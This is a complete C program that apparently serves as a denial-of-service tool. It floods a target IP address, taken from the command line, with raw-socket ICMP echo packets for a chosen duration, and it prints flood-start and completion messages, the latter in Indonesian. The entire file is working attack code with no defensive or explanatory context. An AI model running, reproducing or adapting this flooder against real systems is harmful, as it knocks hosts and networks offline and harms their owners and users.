#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/socket.h>

#define PACKET_SIZE 16

char *target_ip;
int duration;

unsigned short csum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *(unsigned char*)buf;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <duration>\n", argv[0]);
        exit(1);
    }

    target_ip = argv[1];
    duration = atoi(argv[2]);

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        perror("Socket error (run as root)");
        exit(1);
    }

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(target_ip);

    char packet[sizeof(struct icmphdr) + PACKET_SIZE];
    struct icmphdr *icmp = (struct icmphdr*)packet;

    memset(packet + sizeof(struct icmphdr), 'A', PACKET_SIZE);

    icmp->type = ICMP_ECHO;
    icmp->code = 0;
    icmp->un.echo.id = rand();
    icmp->un.echo.sequence = 0;

    time_t end = time(NULL) + duration;

    printf("🔥 ICMP FLOOD STARTED → %s for %d seconds\n", target_ip, duration);

    while (time(NULL) < end) {
        icmp->checksum = 0;
        icmp->checksum = csum((unsigned short*)icmp, sizeof(packet));

        sendto(sock, packet, sizeof(packet), 0, (struct sockaddr*)&addr, sizeof(addr));
        icmp->un.echo.sequence++;
    }

    close(sock);
    printf("✅ Flood selesai! Target: %s\n", target_ip);
    return 0;
}

